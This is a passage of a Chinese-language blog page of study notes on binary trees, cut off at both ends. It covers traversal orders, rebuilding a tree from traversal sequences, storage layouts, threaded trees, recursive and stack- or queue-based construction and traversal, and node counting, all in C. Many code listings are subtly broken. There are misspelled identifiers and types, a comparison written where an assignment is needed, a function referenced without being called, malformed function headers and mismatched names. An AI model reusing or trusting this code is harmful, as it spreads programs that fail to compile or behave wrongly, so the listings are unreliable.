class="comment">//队头右孩子不为空则让右孩子入队</span></span><br><span class="line">            rightchild(p) 入队q;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="二叉树的交叉遍历"><a href="#二叉树的交叉遍历" class="headerlink" title="二叉树的交叉遍历"></a>二叉树的交叉遍历</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">PreOrder</span><span class="params">(BinTree bt)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(bt==<span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    visit(bt);</span><br><span class="line">    InOrder(lefchild(bt));</span><br><span class="line">    InOrder(rightchild(bt));</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">InOrder</span><span class="params">(BinTree bt)</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(bt==<span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    PreOrder(leftchild(bt));</span><br><span class="line">    visit(bt);</span><br><span class="line">    PreOrder(rightchild(bt));</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    bt = CreateBinTree();</span><br><span class="line">    PreOrder(bt);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201214135713.png"></p><h2 id="二叉树的重构"><a href="#二叉树的重构" class="headerlink" title="二叉树的重构"></a>二叉树的重构</h2><ul><li>由遍历序列恢复二叉树</li></ul><p>&#x3D;&#x3D;已知先根序列和对称序列可以恢复二叉树&#x3D;&#x3D;</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201214124613.png"></p><p>&#x3D;&#x3D;已知对称序列和后根序列也可以恢复二叉树&#x3D;&#x3D;</p><p>&#x3D;&#x3D;已知先根序列和后根序列对于满二叉树可以恢复，其他不行&#x3D;&#x3D;</p><blockquote><p>因为满二叉树每个结点都有左孩子和右孩子</p></blockquote><ul><li>先根序列找左孩子</li><li>后跟序列找右孩子</li></ul><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201214125338.png"></p><p>a</p><h2 id="二叉树的存储"><a href="#二叉树的存储" class="headerlink" title="二叉树的存储"></a>二叉树的存储</h2><h3 id="二叉树的顺序存储（完全二叉树）"><a href="#二叉树的顺序存储（完全二叉树）" class="headerlink" title="二叉树的顺序存储（完全二叉树）"></a>二叉树的顺序存储（完全二叉树）</h3><ul><li>用一组地址连续的存储单元按层次次序依次存储的结点</li></ul><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201214143025.png"></p><h3 id="二叉树的链式存储（一般二叉树）"><a href="#二叉树的链式存储（一般二叉树）" class="headerlink" title="二叉树的链式存储（一般二叉树）"></a>二叉树的链式存储（一般二叉树）</h3><p>二叉链表：</p><blockquote><p>二叉链表中，无法通过结点直接找到其双亲</p><blockquote><p>解决办法是在结点中增加一个父结点指针域，转化为三叉链表</p></blockquote></blockquote><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201214143139.png"></p><p>类型定义：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="type">char</span> DataType;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">BTreeNode</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    DataType data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">BTeeNode</span> *<span class="title">leftchild</span>;</span></span><br><span class="line">    structBTreeNode *rightchild;</span><br><span class="line">&#125;BinTreeNode;</span><br><span class="line"><span class="keyword">typedef</span> BinTreeNode *BinTree;</span><br></pre></td></tr></table></figure><h3 id="线索二叉树"><a href="#线索二叉树" class="headerlink" title="线索二叉树"></a>线索二叉树</h3><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201215041515.png"></p><ul><li>类型定义</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="type">char</span> DataType;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">BTreeNode</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    DataType data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">BTreeNode</span> *<span class="title">leftchild</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">BTreeNode</span> *<span class="title">rightchild</span>;</span></span><br><span class="line">    <span class="type">int</span> lthread;</span><br><span class="line">    <span class="type">int</span> rthread;</span><br><span class="line">&#125;BinTreeNode;</span><br><span class="line"><span class="keyword">typedef</span> BinTreeNode *BinTree;</span><br></pre></td></tr></table></figure><h2 id="（递归）二叉树的建立与遍历"><a href="#（递归）二叉树的建立与遍历" class="headerlink" title="（递归）二叉树的建立与遍历"></a>（递归）二叉树的建立与遍历</h2><ul><li>建立：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">BinTree <span class="title function_">CreateBinTree_Recursion</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> ch;</span><br><span class="line">    BinTree bt;</span><br><span class="line">    scanf_s(<span class="string">&quot;%c&quot;</span>,&amp;ch);</span><br><span class="line">    <span class="keyword">if</span>(ch==<span class="string">&#x27;@&#x27;</span>)</span><br><span class="line">        bt == <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        bt = (BinTreeNode *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(BinTreeNode));</span><br><span class="line">        bt-&gt;data = ch;</span><br><span class="line">        bt-&gt;leftchild = CreateBinTree_Recuision();</span><br><span class="line">        bt-&gt;rightchild = CreateBinTree_Recuision();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> bt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="先序遍历-1"><a href="#先序遍历-1" class="headerlink" title="先序遍历"></a>先序遍历</h3><ul><li>真代码</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">PreOrder_Recursion</span><span class="params">(BinTree bt)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(bt==<span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,bt-&gt;data);</span><br><span class="line">    PreOrder_Recursion(bt-&gt;leftchild);</span><br><span class="line">    PreOrder_Recursion(bt-&gt;rightchild);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="中序遍历-1"><a href="#中序遍历-1" class="headerlink" title="中序遍历"></a>中序遍历</h3><ul><li>真代码</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">InOrder_Recursion</span><span class="params">(BinTree bt)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(bt==<span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    InOrder_Recursion(bt-&gt;leftchild);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,bt-&gt;data);</span><br><span class="line">    InOrder_Recursion(bt-&gt;rightchild);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="后序遍历-1"><a href="#后序遍历-1" class="headerlink" title="后序遍历"></a>后序遍历</h3><ul><li>真代码</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">PostOrder_Recursion</span><span class="params">(BinTree bt)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(bt==<span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    PostOrder_Recursion(bt-&gt;leftchild);</span><br><span class="line">    PostOrder_Recursion(bt-&gt;rightchild);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,bt-&gt;data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="广度（层次）遍历"><a href="#广度（层次）遍历" class="headerlink" title="广度（层次）遍历"></a>广度（层次）遍历</h3><ul><li>真代码</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">LevelOrder</span><span class="params">(BinTree bt)</span></span><br><span class="line">&#123;</span><br><span class="line">    BinTree p;</span><br><span class="line">    LinkQueue <span class="built_in">queue</span> = SetNullQueue_Link();<span class="comment">//创建空队列</span></span><br><span class="line">    <span class="keyword">if</span>(bt==<span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    p = bt;</span><br><span class="line">    EnQueue_Link(<span class="built_in">queue</span>,bt);<span class="comment">//根结点入队</span></span><br><span class="line">    <span class="keyword">while</span>(!IsNullQueue_Link(<span class="built_in">queue</span>))<span class="comment">//队列不空，循环执行</span></span><br><span class="line">    &#123;</span><br><span class="line">        p = FrontQueue_link(<span class="built_in">queue</span>);<span class="comment">//取队头</span></span><br><span class="line">        DeQueue_link(<span class="built_in">queue</span>);<span class="comment">//出队</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,p-&gt;data);</span><br><span class="line">        <span class="keyword">if</span>(p-&gt;leftchld!=<span class="literal">NULL</span>)</span><br><span class="line">            EnQueue_link(<span class="built_in">queue</span>.p-&gt;leftchild);<span class="comment">//左孩子不空，入队</span></span><br><span class="line">        <span class="keyword">if</span>(p-&gt;rightchild!=<span class="literal">NULL</span>)</span><br><span class="line">            EnQueue_link(<span class="built_in">queue</span>,p-&gt;rightchild);<span class="comment">//右孩子不空，入队</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="（非递归）二叉树的建立于遍历"><a href="#（非递归）二叉树的建立于遍历" class="headerlink" title="（非递归）二叉树的建立于遍历"></a>（非递归）二叉树的建立于遍历</h2><ul><li><p>非递归建立二叉树算法思路：</p><ol><li><p>将二叉树扩充为完全二叉树，输入&#x3D;&#x3D;完全二叉树序列&#x3D;&#x3D;，以<code>#</code>为结束标志，设置计数器<code>count</code>为<code>-1</code>，用来标志结点的序号</p></li><li><p>如果输入的不是<code>@</code>，则生成一个新的结点<code>s</code>，并对结点的数据域赋值为输入的字符，结点左右指针域为空，结点<code>s</code>入队</p><p>如果输入的是<code>@</code>，<code>@</code>也入队，但不生成新的结点</p><p><code>count++</code></p></li><li><p>如果<code>count=0</code>，则结点为根结点，设置二叉树的根<code>bt=s</code></p><p>如果<code>count=奇数</code>，则结点为父结点<code>p</code>（队头结点）的左孩子，即<code>p-&gt;leftchild=s</code>；</p><p>如果<code>count=偶数</code>，则结点为父结点<code>p</code>（队头结点）的右孩子，即<code>p-&gt;rightchild=s</code>；</p><p>队头结点<code>p</code>处理完毕，出队</p></li></ol></li><li><p>代码实现：</p></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">BinTree <span class="title function_">CreateBinTree_NRecursion</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    LinkQueue <span class="built_in">queue</span> = SetNullQueue_Link();<span class="comment">//设置空队列</span></span><br><span class="line">    BinTreeNode *s, *p, *bt;</span><br><span class="line">    <span class="type">char</span> ch;</span><br><span class="line">    <span class="type">int</span> count = <span class="number">-1</span>;</span><br><span class="line">    ch = getchar();</span><br><span class="line">    bt = <span class="literal">NULL</span>;<span class="comment">//设置二叉树为空</span></span><br><span class="line">    <span class="keyword">while</span>(ch!=<span class="string">&#x27;#&#x27;</span>)<span class="comment">//假设结点的值为单个字符，以#结束</span></span><br><span class="line">    &#123;</span><br><span class="line">        s = <span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">if</span>(ch!=<span class="string">&#x27;@&#x27;</span>)<span class="comment">//判断读入的点是否为虚结点&#x27;@&#x27;</span></span><br><span class="line">        &#123;</span><br><span class="line">            s = (BinTreeNode *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(BinTreeNode));<span class="comment">//申请新结点空间</span></span><br><span class="line">            s-&gt;data = ch;<span class="comment">//新结点数据域赋值</span></span><br><span class="line">            s-&gt;leftchild = s-&gt;rightchild = <span class="literal">NULL</span>;<span class="comment">//新结点左右指针域置空</span></span><br><span class="line">        &#125;</span><br><span class="line">        EnQueue_link(<span class="built_in">queue</span>,s);<span class="comment">//新结点地址或虚结点地址入队</span></span><br><span class="line">        count++;<span class="comment">//计数器++</span></span><br><span class="line">        <span class="keyword">if</span>(count == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            bt = s;<span class="comment">//计数器为0，当前结点为根结点</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            p = FrontQueue_link;<span class="comment">//取队头元素</span></span><br><span class="line">            <span class="keyword">if</span>(s!=<span class="literal">NULL</span>&amp;&amp;p!=<span class="literal">NULL</span>)<span class="comment">//当前结点和双亲结点都不为虚结点</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(count%<span class="number">2</span> == <span class="number">1</span>)<span class="comment">//count为奇数，新结点为左孩子</span></span><br><span class="line">                    p-&gt;leftchild = s;</span><br><span class="line">                <span class="keyword">else</span> p-&gt;rightchild = s;<span class="comment">//count为偶数，新结点为右孩子</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(count % <span class="number">2</span> == <span class="number">0</span>)</span><br><span class="line">            Dequeue_link(<span class="built_in">queue</span>);<span class="comment">//两个孩子处理完毕，出队，处理下一个结点</span></span><br><span class="line">        &#125;</span><br><span class="line">        ch = getchar();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> bt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="先序遍历-2"><a href="#先序遍历-2" class="headerlink" title="先序遍历"></a>先序遍历</h3><ul><li>算法思路一：</li></ul><p>让每个结点都进栈出栈一次，先将根结点压入栈中，如果栈不空，弹出一个元素依次访问其右孩子和左孩子，再重复判断栈是否为空，不空则出栈将其右左孩子入栈，直到栈空为止</p><ul><li>算法实现：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">PreOrder_NRecursion1</span><span class="params">(BinTree bt)</span></span><br><span class="line">&#123;</span><br><span class="line">    LinkStack lstack;</span><br><span class="line">    lstack = SetNullStack_Link();</span><br><span class="line">    BinTreeNode *p;</span><br><span class="line">    Push_link(lstack,bt);<span class="comment">//根结点入栈</span></span><br><span class="line">    <span class="keyword">while</span>(!IsNullStack_link(lstack))</span><br><span class="line">    &#123;</span><br><span class="line">        p = Top_link(lstack);<span class="comment">//弹出入栈结点进行判断</span></span><br><span class="line">        Pop_link(lstack);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,p-&gt;data);</span><br><span class="line">        <span class="keyword">if</span>(p-&gt;rightchild)</span><br><span class="line">            Push_link(lstack,p-&gt;rightchild);<span class="comment">//右子树不空，进栈</span></span><br><span class="line">        <span class="keyword">if</span>(p-&gt;leftchild)</span><br><span class="line">            Push_link(lstack,p-&gt;leftchild);<span class="comment">//左子树不空，进栈</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>算法思路一：</li></ul><p>右孩子入栈，左孩子直接访问，直到遍历完所有的左孩子，判断栈空，如果不空，弹出，访问右结点，直到栈空</p><ul><li>算法实现：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">PreOrder_NRecursion2</span><span class="params">(BinTree bt)</span></span><br><span class="line">&#123;</span><br><span class="line">    LinkStack lstack;<span class="comment">//定义链栈</span></span><br><span class="line">    BinTreeNode *p = bt;</span><br><span class="line">    lstack = SetNullStack_Link();<span class="comment">//初始化链栈</span></span><br><span class="line">    <span class="keyword">if</span>(bt == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    Push_link(lstack,bt);</span><br><span class="line">    <span class="keyword">while</span>(!IsNullStack_link(lstack))<span class="comment">//当栈不空时</span></span><br><span class="line">    &#123;</span><br><span class="line">        p = Top_link(lstack);</span><br><span class="line">        Pop_link(lstack);</span><br><span class="line">        <span class="keyword">while</span>(p)<span class="comment">//当左结点不空时</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,p-&gt;data);<span class="comment">//访问结点</span></span><br><span class="line">            <span class="keyword">if</span>(p-&gt;rightchild)</span><br><span class="line">                Push_link(lstack,p-&gt;rightchild);</span><br><span class="line">            p = p-&gt;leftchild;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="中序遍历-2"><a href="#中序遍历-2" class="headerlink" title="中序遍历"></a>中序遍历</h3><ul><li>算法思路：</li></ul><p>先让所有左分支的结点入栈，然后倒序访问，每访问一个结点过后访问其右子树，如果右子树有内容，则重复让右子树所有结点入栈，直到右子树为空或者栈为空，遍历完成</p><ul><li>算法实现：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> InOrder)NRecursion1(BinTree bt)</span><br><span class="line">&#123;</span><br><span class="line">    LinkStack lstack;</span><br><span class="line">    lstack = SetNullStack_Link();</span><br><span class="line">    BinTree p;</span><br><span class="line">    p = bt;</span><br><span class="line">    <span class="keyword">if</span>(p == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    Push_link(lstack,bt);<span class="comment">//根结点进栈</span></span><br><span class="line">    p = p-&gt;leftchild;<span class="comment">//访问左子树</span></span><br><span class="line">    <span class="keyword">while</span>(p||!IsNullStack_link(lstack))<span class="comment">//当p不空或栈为空时跳出循环</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">while</span>(p!=<span class="literal">NULL</span>)<span class="comment">//当p不空</span></span><br><span class="line">        &#123;</span><br><span class="line">            Push_link(lstack, p);<span class="comment">//左子树结点不断进栈</span></span><br><span class="line">            p = p-&gt;leftchild;</span><br><span class="line">        &#125;</span><br><span class="line">        p = Top_link(lstack());<span class="comment">//取栈顶元素访问</span></span><br><span class="line">        Pop_link(lstack);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,p-&gt;data);</span><br><span class="line">        p = p-&gt;rightchild;<span class="comment">//访问结点的右子树</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="后序遍历-2"><a href="#后序遍历-2" class="headerlink" title="后序遍历"></a>后序遍历</h3><ul><li>算法思路：</li></ul><p>&#x3D;&#x3D;访问的第一个结点应该是叶子结点&#x3D;&#x3D;</p><p>先让所有的左分支的结点入栈，然后检查右分支，如果右分支不为空则继续检查右分支的左分支，直到一个结点的左右两分支都为空，该结点出栈，访问</p><p>如果该结点是父结点的左孩子，则继续进入父结点的右分支检查右分支的左分支</p><p>如果该结点是父结点的右孩子，则访问其父结点，退回到上一层</p><p>直到叶子结点为空且栈也空</p><ul><li>算法实现：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">PostOrder_NRecursion</span><span class="params">(BinTree bt)</span></span><br><span class="line">&#123;</span><br><span class="line">    BinTree p = bt;</span><br><span class="line">    LinkStack lstack;</span><br><span class="line">    <span class="keyword">if</span>(bt == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    lstack = SetNullStack_Link();</span><br><span class="line">    <span class="keyword">while</span>(p!=<span class="literal">NULL</span> || !IsNullStack_link(lstack))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">while</span>(p != <span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            Push_link(lstack,p);</span><br><span class="line">            p = p-&gt;leftchild? p-&gt;leftchild:p-&gt;rightchild;</span><br><span class="line">        &#125;</span><br><span class="line">        p = Top_link(lstack);</span><br><span class="line">        Pop_link(lstack);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,p-&gt;data);</span><br><span class="line">        <span class="keyword">if</span>(!IsNullStack_link(lstack)&amp;&amp;(Top_link(lstack)-&gt;leftchild == p))</span><br><span class="line">            p = (Top_link(lstack))-&gt;rightchild;<span class="comment">//如果当前结点是父结点的左子树，进入父结点的右子树</span></span><br><span class="line">        <span class="keyword">else</span> p = <span class="literal">NULL</span>;<span class="comment">//如果当前结点是父结点的右子树，退回到上一结点</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="二叉树的其他操作"><a href="#二叉树的其他操作" class="headerlink" title="二叉树的其他操作"></a>二叉树的其他操作</h2><h3 id="统计二叉树叶子结点个数"><a href="#统计二叉树叶子结点个数" class="headerlink" title="统计二叉树叶子结点个数"></a>统计二叉树叶子结点个数</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">CountLeafNode</span><span class="params">(BinTree bt)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(bt == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;<span class="comment">//递归调用结束条件</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>((bt-&gt;leftchild == <span class="literal">NULL</span>)&amp;&amp;(bt-&gt;rightchild == <span class="literal">NULL</span>))<span class="comment">//如果是叶子结点返回1</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">else</span><span class="comment">//递归遍历左子树和右子树</span></span><br><span class="line">        <span class="keyword">return</span>(CountLeafNode(bt-&gt;leftchild) + CountLeafNode(bt-&gt;rightchild));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="统计二叉树总的结点个数"><a href="#统计二叉树总的结点个数" class="headerlink" title="统计二叉树总的结点个数"></a>统计二叉树总的结点个数</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">CountNode</span><span class="params">(BinTree bt)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(bt == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;<span class="comment">//递归调用结束条件</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span>(CountNode(bt-&gt;leftchild) + CountNode(bt-&gt;rightchild) + <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="统计二叉树右结点数"><a href="#统计二叉树右结点数" class="headerlink" title="统计二叉树右结点数"></a>统计二叉树右结点数</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">CountRightNode</span><span class="params">(BinTree bt)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> num = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(bt == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(bt-&gt;rightchild!=<span class="literal">NULL</span>)</span><br><span class="line">        num++;</span><br><span class="line">    num += 